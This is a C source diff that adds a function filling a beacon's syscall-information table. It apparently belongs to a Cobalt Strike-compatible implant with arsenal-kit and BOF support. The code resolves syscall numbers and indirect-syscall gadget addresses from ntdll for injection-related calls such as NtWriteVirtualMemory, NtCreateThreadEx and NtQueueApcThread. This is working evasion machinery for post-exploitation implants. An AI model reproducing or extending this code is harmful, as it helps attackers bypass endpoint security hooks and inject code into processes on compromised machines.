@@ -558,6 +558,89 @@ int syscalls_gate_ready_count(void) {
 	return n;
 }
 
+/* 4.11 BeaconGetSyscallInformation (arsenal-kit 20251100 contract): copy
+ * the full 36-entry + RTL table into the BOF's own buffer (4.11 breaking
+ * change: by-copy, not pointer handoff, so the table stays valid while
+ * beacon sleeps masked). Slots covered by our static SC_LIST entries use
+ * the live resolved table; the remaining official slots are parsed
+ * straight off ntdll on demand (parse_nt_stub is name-generic). Entries
+ * that fail to resolve keep fnAddr + zeroed jmp/sysnum - consumers fall
+ * back to the standard API for those. */
+BOOL syscalls_fill_beacon_syscalls(PBEACON_SYSCALLS info, SIZE_T infoSize, BOOL resolveIfNotInitialized)
+{
+	HMODULE nt;
+	if (info == NULL || infoSize < sizeof(BEACON_SYSCALLS))
+		return FALSE;
+	if (!sc_ready && resolveIfNotInitialized)
+		syscalls_resolve();
+	nt = GetModuleHandleA("ntdll.dll");
+	if (nt == NULL)
+		return FALSE;
+	memset(info, 0, sizeof(*info));
+	{
+		struct { const char * name; sc_entry * e; BEACON_SC_ENTRY * out; } map[] = {
+			{ "NtAllocateVirtualMemory",     &sc_alloc,   &info->syscalls.ntAllocateVirtualMemory },
+			{ "NtProtectVirtualMemory",      &sc_protect, &info->syscalls.ntProtectVirtualMemory },
+			{ "NtFreeVirtualMemory",         &sc_free,    &info->syscalls.ntFreeVirtualMemory },
+			{ "NtGetContextThread",          &sc_getctx,  &info->syscalls.ntGetContextThread },
+			{ "NtSetContextThread",          &sc_setctx,  &info->syscalls.ntSetContextThread },
+			{ "NtResumeThread",              &sc_resume,  &info->syscalls.ntResumeThread },
+			{ "NtCreateThreadEx",            &sc_thrdex,  &info->syscalls.ntCreateThreadEx },
+			{ "NtOpenProcess",               &sc_openproc,&info->syscalls.ntOpenProcess },
+			{ "NtOpenThread",                &sc_openthrd,&info->syscalls.ntOpenThread },
+			{ "NtClose",                     &sc_close,   &info->syscalls.ntClose },
+			{ "NtCreateSection",             &sc_sect,    &info->syscalls.ntCreateSection },
+			{ "NtMapViewOfSection",          &sc_mapview, &info->syscalls.ntMapViewOfSection },
+			{ "NtUnmapViewOfSection",        &sc_unmap,   &info->syscalls.ntUnmapViewOfSection },
+			{ "NtQueryVirtualMemory",        &sc_qvmem,   &info->syscalls.ntQueryVirtualMemory },
+			{ "NtDuplicateObject",           &sc_dup,     &info->syscalls.ntDuplicateObject },
+			{ "NtReadVirtualMemory",         &sc_read,    &info->syscalls.ntReadVirtualMemory },
+			{ "NtWriteVirtualMemory",        &sc_write,   &info->syscalls.ntWriteVirtualMemory },
+			{ "NtReadFile",                  &sc_rfile,   &info->syscalls.ntReadFile },
+			{ "NtWriteFile",                 &sc_wfile,   &info->syscalls.ntWriteFile },
+			{ "NtCreateFile",                &sc_cfile,   &info->syscalls.ntCreateFile },
+			{ "NtQueueApcThread",            NULL,        &info->syscalls.ntQueueApcThread },
+			{ "NtCreateProcess",             NULL,        &info->syscalls.ntCreateProcess },
+			{ "NtOpenProcessToken",          NULL,        &info->syscalls.ntOpenProcessToken },
+			{ "NtTestAlert",                 NULL,        &info->syscalls.ntTestAlert },
+			{ "NtSuspendProcess",            NULL,        &info->syscalls.ntSuspendProcess },
+			{ "NtResumeProcess",             NULL,        &info->syscalls.ntResumeProcess },
+			{ "NtQuerySystemInformation",    NULL,        &info->syscalls.ntQuerySystemInformation },
+			{ "NtQueryDirectoryFile",        NULL,        &info->syscalls.ntQueryDirectoryFile },
+			{ "NtSetInformationProcess",     NULL,        &info->syscalls.ntSetInformationProcess },
+			{ "NtSetInformationThread",      NULL,        &info->syscalls.ntSetInformationThread },
+			{ "NtQueryInformationProcess",   &sc_qviproc,&info->syscalls.ntQueryInformationProcess },
+			{ "NtQueryInformationThread",    &sc_qvithrd,&info->syscalls.ntQueryInformationThread },
+			{ "NtOpenSection",               NULL,        &info->syscalls.ntOpenSection },
+			{ "NtAdjustPrivilegesToken",     NULL,        &info->syscalls.ntAdjustPrivilegesToken },
+			{ "NtDeviceIoControlFile",       NULL,        &info->syscalls.ntDeviceIoControlFile },
+			{ "NtWaitForMultipleObjects",    NULL,        &info->syscalls.ntWaitForMultipleObjects },
+		};
+		size_t i;
+		for (i = 0; i < sizeof(map) / sizeof(map[0]); i++) {
+			BYTE * fn = (BYTE *)GetProcAddress(nt, map[i].name);
+			if (fn == NULL)
+				continue;
+			map[i].out->fnAddr = fn;
+			if (map[i].e != NULL && map[i].e->ready) {
+				map[i].out->jmpAddr = map[i].e->gadget;
+				map[i].out->sysnum = map[i].e->ssn;
+			}
+			else {
+				sc_entry tmp;
+				if (parse_nt_stub(fn, &tmp)) {
+					map[i].out->jmpAddr = tmp.gadget;
+					map[i].out->sysnum = tmp.ssn;
+				}
+			}
+		}
+	}
+	info->rtls.rtlDosPathNameToNtPathNameUWithStatusAddr = (PVOID)GetProcAddress(nt, "RtlDosPathNameToNtPathName_U_WithStatus");
+	info->rtls.rtlFreeHeapAddr    = (PVOID)GetProcAddress(nt, "RtlFreeHeap");
+	info->rtls.rtlGetProcessHeapAddr = (PVOID)GetProcAddress(nt, "RtlGetProcessHeap");
+	return TRUE;
+}
+
 /* ---- typed dispatchers (arity kept exact per NT signature) ---- */
 
 typedef NTSTATUS(NTAPI *fn_NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
@@ -655,6 +738,10 @@ int syscalls_ssn_ntwrite(void) { return 0; }
 void * syscalls_test_gadget(const char * name);
 
 int syscalls_gate_ready_count(void) { return 0; }
+BOOL syscalls_fill_beacon_syscalls(PBEACON_SYSCALLS info, SIZE_T infoSize, BOOL resolveIfNotInitialized) {
+	(void)info; (void)infoSize; (void)resolveIfNotInitialized;
+	return FALSE; /* x86: the gate syscall machinery is x64-only */
+}
 #endif
 
 /* ===================== Win32-shaped gate wrappers ===================== */
